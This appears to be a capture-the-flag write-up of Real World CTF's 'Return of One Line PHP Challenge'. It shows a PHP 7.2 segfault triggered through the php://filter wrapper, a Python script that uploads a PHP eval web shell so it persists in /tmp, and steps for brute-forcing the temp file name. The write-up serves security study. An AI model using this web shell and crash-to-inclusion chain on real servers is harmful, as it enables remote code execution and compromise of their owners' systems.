### References

- [@wupco, rwctf | The return of One Line PHP Challenge, 2018-12-02](http://www.wupco.cn/?p=4465)
- [@Smi1e, Real World CTF Of "The Return of One Line PHP Challenge", 2018-12-05](https://www.anquanke.com/post/id/167219)
- [@王一航, LFI via SegmentFault, 2017-11-08](https://www.jianshu.com/p/dfd049924258)

**Tag: PHP wrappers, Segment Fault**

There was one bug submitted in 2017 from 王一航, which was segmentation fault in php version < 7.2, you can get information in reference[3]

This challenge is similar to this bug, but the php version given here was 7.2, 
so we need to find segmentation fault in 7.2. [Here](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/Hk-2nUb3Q?type=view) is analysis from @wupco, and we can get the POC:

```php
php > echo phpversion();
7.2.12
php > file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));
Segmentation fault (core dumped)
```

1.As everyone knows, when we upload a file, server make a temp file having same content as uploaded file and after some time it gets deleted.

The temp file will be stored in the default temporary directory of the server after file is uploaded, and the directory is specified by the `upload_tmp_dir` attribute of php.ini

- Generally, Linxu temporary files are stored in the `/tmp` folder, and named `/tmp/php[6 random letter]`
- And Windows is `C:/Windows/`, may also be `C:/Windows/Temp/`, and named `C:/Windows/php[4 random letter].tmp`

2.We can use the following script to make POST request and send shell file:

```python
import io
import requests

HOST = "http://192.168.200.129/test.php"
SHELL = "@<?php eval($_REQUEST[a]);?>"
PAYLOAD = "php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA"

f = {'file': io.BytesIO(SHELL.encode())}
url = HOST + f'?orange={PAYLOAD}'
with requests.session() as s:
    r = s.post(url=url, files=f, allow_redirects=False)
    print(r.status_code)
```

The output status code in Apache is 500, and in Nginx is 502. In `/tmp`, we can find the temp file:

![](https://i.imgur.com/5abE2HS.png)

3.Now we just need to bruteforce for the temp file. But before that, we can upload multiple times to generate a large number of temp files which can improve the efficiency of brute force.

For demonstration, I changed the file name manually:

![](https://i.imgur.com/FgqLSzm.png)

btw, i dont know how to terminate the program in multiple threads. sad😥

![](https://i.imgur.com/xLq4H38.png)

---

2021.06.02 Update:

Later learned to use the `Event` module.

> `Event` is an object that can be used in multiple threads, initially it contains a signal flag of `False`, once this flag is changed to `True` in any one thread, then all threads will see this flag become True

So a slight modification to the poc.py. When `event.set()` is executed, Another thread is then terminated.